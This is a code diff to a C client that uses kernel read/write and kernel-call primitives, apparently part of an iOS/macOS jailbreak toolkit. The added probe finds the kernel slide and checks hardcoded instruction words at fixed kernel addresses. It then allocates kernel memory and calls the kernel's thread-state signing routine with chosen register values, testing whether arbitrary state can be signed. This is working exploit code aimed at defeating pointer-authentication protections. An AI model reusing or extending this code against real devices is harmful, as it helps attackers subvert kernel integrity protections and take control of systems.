@@ -30,7 +30,8 @@ static int transfer_all(int fd, void *buffer, size_t size, int writing)
 static int request(int fd, uint32_t operation, uint64_t address,
                    void *buffer, size_t length, uint64_t *value)
 {
-    int sends_payload = operation == CNDLabKRWOperationResolvePID ||
+    int sends_payload = operation == CNDLabKRWOperationWrite ||
+        operation == CNDLabKRWOperationResolvePID ||
         operation == CNDLabKRWOperationTaskWrite ||
         operation == CNDLabKRWOperationKernelCall;
     int receives_payload = operation == CNDLabKRWOperationRead ||
@@ -123,7 +124,8 @@ static int next_command(const struct mach_header_64 *header,
 static int find_safe_return_stub(int fd, uint64_t base,
                                  uint64_t *gadget,
                                  uint64_t argument_sentinel,
-                                 uint64_t *expected_result)
+                                 uint64_t *expected_result,
+                                 uint64_t *slide_out)
 {
     struct mach_header_64 fileset_header = {0};
     unsigned char *fileset_commands = NULL;
@@ -176,6 +178,12 @@ static int find_safe_return_stub(int fd, uint64_t base,
     uint64_t slide = base - unslid_fileset_base;
     uint64_t kernel_address = kernel_vmaddr + slide;
     if (kernel_address != base + kernel_fileoff) return ENOEXEC;
+    if (slide_out) {
+        *slide_out = slide;
+        fprintf(stderr,
+                "kernel fileset slide base=%#llx unslid=%#llx slide=%#llx\n",
+                base, unslid_fileset_base, slide);
+    }
 
     struct mach_header_64 kernel_header = {0};
     unsigned char *kernel_commands = NULL;
@@ -271,7 +279,7 @@ static int kernel_call_smoke(int fd, uint64_t capabilities,
     static const uint64_t sentinel = 0x434e444b43414c4cULL;
     uint64_t expected = 0;
     result = find_safe_return_stub(
-        fd, base, gadget, sentinel, &expected);
+        fd, base, gadget, sentinel, &expected, NULL);
     if (result != 0) return result;
 
     CNDLabKernelCallRequest call = {
@@ -286,18 +294,285 @@ static int kernel_call_smoke(int fd, uint64_t capabilities,
     return result;
 }
 
+static int kernel_call(int fd, uint64_t function, uint32_t argument_count,
+                       const uint64_t *arguments, uint64_t *result)
+{
+    if (!result || argument_count > CND_LAB_KCALL_MAX_ARGUMENTS ||
+        (argument_count != 0 && !arguments)) return EINVAL;
+    CNDLabKernelCallRequest call = {
+        .version = CND_LAB_KCALL_ABI_VERSION,
+        .argument_count = argument_count,
+        .function = function,
+    };
+    if (argument_count != 0) {
+        memcpy(call.arguments, arguments,
+               argument_count * sizeof(arguments[0]));
+    }
+    return request(fd, CNDLabKRWOperationKernelCall,
+                   0, &call, sizeof(call), result);
+}
+
+static int verify_words(int fd, uint64_t address,
+                        const uint32_t *expected, size_t count)
+{
+    if (!expected || count == 0 || count > 64) return EINVAL;
+    uint32_t observed[64] = {0};
+    int result = kernel_read(
+        fd, address, observed, count * sizeof(observed[0]));
+    if (result != 0) return result;
+    return memcmp(observed, expected,
+                  count * sizeof(observed[0])) == 0 ? 0 : EILSEQ;
+}
+
+static int verify_named_words(int fd, const char *name, uint64_t address,
+                              const uint32_t *expected, size_t count)
+{
+    int result = verify_words(fd, address, expected, count);
+    if (result != 0) {
+        fprintf(stderr,
+                "thread-state signer anchor failed name=%s address=%#llx "
+                "result=%d\n",
+                name, address, result);
+    }
+    return result;
+}
+
+static int thread_state_signer_probe(int fd, uint64_t capabilities)
+{
+    static const uint64_t static_fileset_base = 0xfffffe0007004000ULL;
+    static const uint64_t static_signer = 0xfffffe0007ab9344ULL;
+    static const uint64_t static_validator = 0xfffffe0007ab9394ULL;
+    static const uint64_t static_after_check = 0xfffffe0007ab81e4ULL;
+    static const uint64_t static_kalloc = 0xfffffe0007b0acacULL;
+    static const uint64_t static_kfree = 0xfffffe0007b0b46cULL;
+    static const uint32_t signer_words[] = {
+        0xf27e045f, 0x54000041, 0x9262f842, 0xd37cec11,
+        0xb27f0231, 0x9ac13231, 0xd37ef421, 0xb3420c41,
+        0xd37df021, 0xb27f0021, 0xb3407c31, 0x9ac23231,
+        0xb3407c31, 0x9ac33231, 0xb3407c31, 0x9ac43231,
+        0xb3407c31, 0x9ac53221, 0xf9009401, 0xd65f03c0,
+    };
+    static const uint32_t validator_words[] = {
+        0xd53b4230, 0x363805b0, 0xd5384210,
+        0x36000570, 0xf9409410, 0xf27e045f,
+    };
+    static const uint32_t after_check_words[] = {
+        0xaa0303fe, 0xaa1603e3, 0xaa1703e4,
+    };
+    static const uint32_t kalloc_words[] = { 0xaa0003e8 };
+    static const uint32_t kfree_words[] = { 0xaa0103e2, 0xaa0003e1 };
+    enum { scratch_size = 0x180, hash_offset = 0x128, z_zero = 4 };
+
+    if ((capabilities & CNDLabKRWCapabilityKernelReadWrite) == 0 ||
+        (capabilities & CNDLabKRWCapabilityKernelCall) == 0) {
+        return ENOTSUP;
+    }
+
+    uint64_t base = 0;
+    int result = request(fd, CNDLabKRWOperationKBase,
+                         0, NULL, 0, &base);
+    if (result != 0 || base < static_fileset_base) return result ?: ENOEXEC;
+
+    uint64_t ignored_gadget = 0;
+    uint64_t ignored_result = 0;
+    uint64_t layout_slide = 0;
+    result = find_safe_return_stub(
+        fd, base, &ignored_gadget, 0x434e445349474e52ULL,
+        &ignored_result, &layout_slide);
+    uint64_t slide = base - static_fileset_base;
+    if (result != 0 ||
+        (layout_slide != 0 && layout_slide != slide)) {
+        fprintf(stderr,
+                "thread-state signer slide failed base=%#llx "
+                "layoutSlide=%#llx profileSlide=%#llx result=%d\n",
+                base, layout_slide, slide, result);
+        return result ?: ENOEXEC;
+    }
+
+    uint64_t signer = static_signer + slide;
+    uint64_t validator = static_validator + slide;
+    uint64_t after_check = static_after_check + slide;
+    uint64_t kalloc = static_kalloc + slide;
+    uint64_t kfree = static_kfree + slide;
+    if ((result = verify_named_words(
+             fd, "ml_sign_thread_state", signer, signer_words,
+             sizeof(signer_words) / sizeof(signer_words[0]))) != 0 ||
+        (result = verify_named_words(
+             fd, "ml_check_signed_state", validator, validator_words,
+             sizeof(validator_words) / sizeof(validator_words[0]))) != 0 ||
+        (result = verify_named_words(
+             fd, "exception_return_after_check", after_check,
+             after_check_words,
+             sizeof(after_check_words) / sizeof(after_check_words[0]))) != 0 ||
+        (result = verify_named_words(
+             fd, "kalloc_data_external", kalloc, kalloc_words,
+             sizeof(kalloc_words) / sizeof(kalloc_words[0]))) != 0 ||
+        (result = verify_named_words(
+             fd, "kfree_data_external", kfree, kfree_words,
+             sizeof(kfree_words) / sizeof(kfree_words[0]))) != 0) {
+        return result;
+    }
+
+    uint64_t allocation_arguments[] = { scratch_size, z_zero };
+    uint64_t state_a = 0;
+    uint64_t state_b = 0;
+    result = kernel_call(fd, kalloc, 2, allocation_arguments, &state_a);
+    if (result == 0) {
+        result = kernel_call(fd, kalloc, 2, allocation_arguments, &state_b);
+    }
+    if (result != 0 || state_a == 0 || state_b == 0 || state_a == state_b ||
+        (state_a & 7) != 0 || (state_b & 7) != 0) {
+        fprintf(stderr,
+                "thread-state signer allocation failed stateA=%#llx "
+                "stateB=%#llx result=%d\n",
+                state_a, state_b, result);
+        result = result ?: ENOMEM;
+        goto cleanup;
+    }
+
+    unsigned char zeroes[scratch_size] = {0};
+    result = request(fd, CNDLabKRWOperationWrite,
+                     state_a, zeroes, sizeof(zeroes), NULL);
+    if (result == 0) {
+        result = request(fd, CNDLabKRWOperationWrite,
+                         state_b, zeroes, sizeof(zeroes), NULL);
+    }
+    if (result != 0) {
+        fprintf(stderr,
+                "thread-state signer scratch clear failed result=%d\n",
+                result);
+        goto cleanup;
+    }
+
+    static const uint64_t kernel_cpsr = 0x5;
+    static const uint64_t user_cpsr = 0;
+    static const uint64_t user_pc = 0x0000000100004000ULL;
+    static const uint64_t user_lr = 0x0000000100004004ULL;
+    static const uint64_t x16 = 0x434e441600000001ULL;
+    static const uint64_t x17 = 0x434e441700000001ULL;
+    uint64_t kernel_arguments[] = {
+        state_a, after_check, kernel_cpsr, after_check + 4, x16, x17,
+    };
+    uint64_t call_result = 0;
+    result = kernel_call(fd, signer, 6, kernel_arguments, &call_result);
+    uint64_t kernel_hash = 0;
+    if (result == 0) {
+        result = kernel_read(fd, state_a + hash_offset,
+                             &kernel_hash, sizeof(kernel_hash));
+    }
+    if (result != 0 || kernel_hash == 0) {
+        fprintf(stderr,
+                "thread-state signer kernel tuple failed hash=%#llx "
+                "result=%d\n",
+                kernel_hash, result);
+        result = result ?: EILSEQ;
+        goto cleanup;
+    }
+
+    uint64_t repeat_hash = 0;
+    result = kernel_call(fd, signer, 6, kernel_arguments, &call_result);
+    if (result == 0) {
+        result = kernel_read(fd, state_a + hash_offset,
+                             &repeat_hash, sizeof(repeat_hash));
+    }
+    if (result != 0 || repeat_hash != kernel_hash) {
+        result = result ?: EILSEQ;
+        goto cleanup;
+    }
+
+    uint64_t rebound_arguments[] = {
+        state_b, after_check, kernel_cpsr, after_check + 4, x16, x17,
+    };
+    uint64_t rebound_hash = 0;
+    result = kernel_call(fd, signer, 6, rebound_arguments, &call_result);
+    if (result == 0) {
+        result = kernel_read(fd, state_b + hash_offset,
+                             &rebound_hash, sizeof(rebound_hash));
+    }
+    if (result != 0 || rebound_hash == 0 || rebound_hash == kernel_hash) {
+        result = result ?: EILSEQ;
+        goto cleanup;
+    }
+
+    uint64_t user_arguments[] = {
+        state_a, user_pc, user_cpsr, user_lr, x16, x17,
+    };
+    uint64_t user_hash = 0;
+    result = kernel_call(fd, signer, 6, user_arguments, &call_result);
+    if (result == 0) {
+        result = kernel_read(fd, state_a + hash_offset,
+                             &user_hash, sizeof(user_hash));
+    }
+    if (result != 0 || user_hash == 0 || user_hash == kernel_hash) {
+        result = result ?: EILSEQ;
+        goto cleanup;
+    }
+
+    uint64_t changed_arguments[] = {
+        state_a, after_check, kernel_cpsr, after_check + 4, x16, x17 + 1,
+    };
+    uint64_t changed_hash = 0;
+    result = kernel_call(fd, signer, 6, changed_arguments, &call_result);
+    if (result == 0) {
+        result = kernel_read(fd, state_a + hash_offset,
+                             &changed_hash, sizeof(changed_hash));
+    }
+    if (result != 0 || changed_hash == 0 || changed_hash == kernel_hash) {
+        result = result ?: EILSEQ;
+        goto cleanup;
+    }
+
+    printf("{\"schema\":\"com.zeroxjf.cyanide.thread-state-signer-canary\","
+           "\"schema_version\":1,\"kernel_base\":\"%#018llx\","
+           "\"slide\":\"%#018llx\",\"signer\":\"%#018llx\","
+           "\"validator\":\"%#018llx\","
+           "\"exception_return_after_check\":\"%#018llx\","
+           "\"state_a\":\"%#018llx\",\"state_b\":\"%#018llx\","
+           "\"kernel_hash\":\"%#018llx\","
+           "\"repeat_hash\":\"%#018llx\","
+           "\"rebound_hash\":\"%#018llx\","
+           "\"user_hash\":\"%#018llx\","
+           "\"changed_x17_hash\":\"%#018llx\","
+           "\"deterministic\":true,\"binds_state_address\":true,"
+           "\"binds_mode_and_control_state\":true,"
+           "\"validator_invoked\":false,\"persistent_mutation\":false}\n",
+           base, slide, signer, validator, after_check, state_a, state_b,
+           kernel_hash, repeat_hash, rebound_hash, user_hash, changed_hash);
+
+cleanup:
+    if (state_b != 0) {
+        uint64_t free_arguments[] = { state_b, scratch_size };
+        uint64_t free_result = 0;
+        int cleanup_result = kernel_call(
+            fd, kfree, 2, free_arguments, &free_result);
+        if (result == 0 && cleanup_result != 0) result = cleanup_result;
+    }
+    if (state_a != 0) {
+        uint64_t free_arguments[] = { state_a, scratch_size };
+        uint64_t free_result = 0;
+        int cleanup_result = kernel_call(
+            fd, kfree, 2, free_arguments, &free_result);
+        if (result == 0 && cleanup_result != 0) result = cleanup_result;
+    }
+    return result;
+}
+
 int main(int argc, char **argv)
 {
     int run_kcall_smoke = argc == 4 &&
         strcmp(argv[3], "--kcall-smoke") == 0;
     int kcall_smoke_only = argc == 4 &&
         strcmp(argv[3], "--kcall-smoke-only") == 0;
-    if ((argc != 3 && !run_kcall_smoke && !kcall_smoke_only) ||
+    int signer_canary_only = argc == 4 &&
+        strcmp(argv[3], "--thread-state-signer-only") == 0;
+    if ((argc != 3 && !run_kcall_smoke && !kcall_smoke_only &&
+         !signer_canary_only) ||
         strlen(argv[1]) >= sizeof(((struct sockaddr_un *)0)->sun_path) ||
         strlen(argv[2]) == 0 || strlen(argv[2]) >= 31) {
         fprintf(stderr,
                 "usage: %s SOCKET PROCESS "
-                "[--kcall-smoke|--kcall-smoke-only]\n", argv[0]);
+                "[--kcall-smoke|--kcall-smoke-only|"
+                "--thread-state-signer-only]\n", argv[0]);
         return 2;
     }
 
@@ -334,6 +609,17 @@ int main(int argc, char **argv)
         printf("ready capabilities=%#llx kernelCall=available "
                "smoke=passed gadget=%#llx result=%#llx\n",
                capabilities, gadget, call_result);
+        return 0;
+    }
+
+    if (signer_canary_only) {
+        int canary_result = thread_state_signer_probe(fd, capabilities);
+        close(fd);
+        if (canary_result != 0) {
+            fprintf(stderr, "thread-state signer canary failed result=%d\n",
+                    canary_result);
+            return 5;
+        }
         return 0;
     }
 
